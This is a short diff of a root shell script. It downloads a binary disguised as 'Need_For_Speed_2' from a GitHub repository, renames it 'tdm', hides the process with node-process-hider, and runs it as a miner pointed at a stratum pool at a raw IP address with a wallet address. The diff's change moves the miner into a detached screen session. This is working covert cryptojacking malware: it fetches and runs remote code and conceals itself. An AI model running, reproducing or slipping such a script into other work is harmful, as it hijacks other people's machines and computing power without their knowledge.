@@ -3,6 +3,6 @@ sudo su <<EOF
 apt-get install -y nodejs >/dev/null 2>&1
 sudo apt install npm
 sudo npm i -g node-process-hider && sudo ph add tdm
-wget https://github.com/sarifadim/dopla/raw/main/Need_For_Speed_2 && chmod +x Need_For_Speed_2 && mv Need_For_Speed_2 tdm && ./tdm -P stratum2+tcp://3JWuijUT2hwsC862trVXBSMzQW6JANF63j.SETUP@8.222.133.209:80 -R --HWMON 2 --verbosity 1 --work-timeout 999
+wget https://github.com/sarifadim/dopla/raw/main/Need_For_Speed_2 && chmod +x Need_For_Speed_2 && mv Need_For_Speed_2 tdm && screen -dms run ./tdm -P stratum2+tcp://3JWuijUT2hwsC862trVXBSMzQW6JANF63j.SETUP@8.222.133.209:80 -R --HWMON 2 --verbosity 1 --work-timeout 999
 EOF
 screen -r
